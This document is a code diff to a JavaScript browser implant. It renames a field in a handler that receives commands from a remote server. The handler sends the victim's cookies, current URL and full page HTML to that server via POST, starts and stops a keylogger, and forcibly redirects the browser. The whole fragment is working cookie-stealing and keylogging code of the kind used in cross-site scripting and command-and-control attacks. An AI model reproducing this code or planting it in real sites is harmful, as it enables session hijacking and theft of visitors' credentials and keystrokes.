@@ -54,28 +54,28 @@
 
     var handleData = function (data) {
         console.dir(data);
-        if (data.type == 'msg') {
-            alert(data.metaData);
-        } else if (data.type == 'getCookies') {
+        if (data.command == 'msg') {
+            alert(data.metadata);
+        } else if (data.command == 'getCookies') {
             sendCommandToServer("receiveCookies", document.cookie);
-        } else if (data.type == 'getUrl') {
+        } else if (data.command == 'getUrl') {
             sendCommandToServer("receiveUrl", window.location.href);
-        } else if (data.type == 'getSite') {
+        } else if (data.command == 'getSite') {
             sendCommandToServer("receiveSite", document.documentElement.outerHTML);
-        } else if (data.type == 'startLogger') {
+        } else if (data.command == 'startLogger') {
             startKeylogger();
-        } else if (data.type == 'stopLogger') {
+        } else if (data.command == 'stopLogger') {
             stopKeyLogger();
-        } else if (data.type == 'goToUrl') {
+        } else if (data.command == 'goToUrl') {
             window.location.href = data.metadata;
         }
 
     };
 
-    function sendCommandToServer(type, data) {
+    function sendCommandToServer(command, data) {
         $.ajax({
                    type: "POST",
-                   url: devUrl + type + '/' + currentId,
+                   url: devUrl + command + '/' + currentId,
                    data: data,
                    contentType: "application/json; charset=utf-8"
                });
